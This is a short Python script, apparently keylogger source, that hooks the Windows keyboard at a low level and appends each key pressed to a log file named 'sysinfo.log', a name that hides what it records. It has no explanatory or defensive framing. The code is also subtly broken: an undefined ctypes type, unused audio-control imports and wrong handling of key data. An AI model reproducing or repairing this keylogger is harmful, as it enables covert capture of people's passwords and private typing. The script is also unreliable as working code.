import logging
from ctypes import windll, CFUNCTYPE, c_uint, POINTER, cast
from comtypes import CLSCTX_ALL
from pycaw.pycaw import IAudioEndpointVolume

def log_key(key):
    try:
        with open('sysinfo.log', 'a') as f:
            f.write(f'{key.char}\n')
    except AttributeError:
        if key == 32:
            with open('sysinfo.log', 'a') as f:
                f.write('Space\n')
        elif key == 13:
            with open('sysinfo.log', 'a') as f:
                f.write('Enter\n')
        else:
            with open('sysinfo.log', 'a') as f:
                f.write(f'Special Key {key}\n')
def hook_keyboard(callback):
    WH_KEYBOARD_LL = 13
    user32 = windll.user32
    hookProc = CFUNCTYPE(c_int, c_uint, POINTER(c_uint), POINTER(POINTER(c_uint)))(callback)
    return user32.SetWindowsHookExW(WH_KEYBOARD_LL, hookProc, None, 0)
def on_key_event(nCode, wParam, lParam):
    if nCode >= 0 and wParam == 256:
        log_key(lParam[0])
    return windll.user32.CallNextHookEx(None, nCode, wParam, lParam)
hook = hook_keyboard(on_key_event)
windll.kernel32.GetMessageW(None, 0, 0, 0)